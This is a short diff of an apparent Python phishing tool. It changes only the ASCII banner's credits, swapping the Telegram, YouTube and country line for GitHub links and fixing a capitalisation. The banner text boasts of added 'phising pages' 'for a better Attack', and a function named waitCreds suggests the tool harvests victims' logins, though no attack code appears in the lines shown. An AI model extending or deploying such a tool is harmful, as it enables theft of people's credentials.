@@ -57,7 +57,7 @@ def end():
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
 
- {0}This script was made by UndeadSec_ But I have added some more features in it ]
+ {0}This script was made by Undeadsec_ But I have added some more features in it ]
 
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
 
@@ -128,7 +128,7 @@ def waitCreds():
 
 def runPEnv():
     system('clear')
-    print '''           {2}-{1} UNDEADSEC {2}|{1} t.me/UndeadSec {2}|{1} youtube.com/c/UndeadSec {2}- BRAZIL
+    print '''           {2}-{1} https://github.com/An0nUD4Y {2}|{1} AnonUD4Y {2}|{1} https://github.com/An0nUD4Y {2}- INDIA
                           '
                         '   '
                       '       '
@@ -144,7 +144,7 @@ def runPEnv():
                '  .  .  .  .  . '.    .'              '  .
                    '         '    '. '      {1}Updated_By--> AnonUD4Y_{2}    
                      '       '      '             
-                       ' .  '
+                       ' .  '                https://github.com/An0nUD4Y
                            '
                              {1}'''.format(GREEN, END, CYAN)
 
